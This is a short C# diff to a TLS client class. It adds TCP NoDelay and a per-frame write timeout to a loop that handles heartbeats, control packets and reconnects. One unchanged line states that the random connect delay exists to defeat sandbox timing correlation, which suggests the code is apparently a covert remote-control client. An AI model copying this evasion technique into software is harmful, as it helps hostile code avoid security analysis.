@@ -65,6 +65,7 @@ internal class TlsClient : IDisposable
         // Jitter: randomize initial connect time to defeat sandbox timing correlation
         await Task.Delay(Random.Shared.Next(100, 501), ct);
         _tcp = new TcpClient();
+        _tcp.NoDelay = true; // disable Nagle — heartbeats and small ctrl packets send immediately
         await _tcp.ConnectAsync(_host, _port, ct);
 
         _ssl = new SslStream(_tcp.GetStream(), false, ValidateServerCert);
@@ -1547,10 +1548,14 @@ internal class TlsClient : IDisposable
                 while (_ctrlCh.Reader.TryRead(out var ctrl))
                     await WriteRawAsync(ctrl, ct);
 
-                // ② Write one frame if pending (respects _ctrlCh priority on next loop)
+                // ② Write one frame if pending (respects _ctrlCh priority on next loop).
+                // 12s timeout: if a large frame stalls on a congested tunnel the stream is
+                // flagged bad and RunAsync reconnects — well within the 25s watchdog window.
                 if (_frameCh.Reader.TryRead(out var frame))
                 {
-                    await WriteRawAsync(frame, ct);
+                    using var frameCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
+                    frameCts.CancelAfter(12_000);
+                    await WriteRawAsync(frame, frameCts.Token);
                     continue; // recheck ctrl before next frame
                 }
 
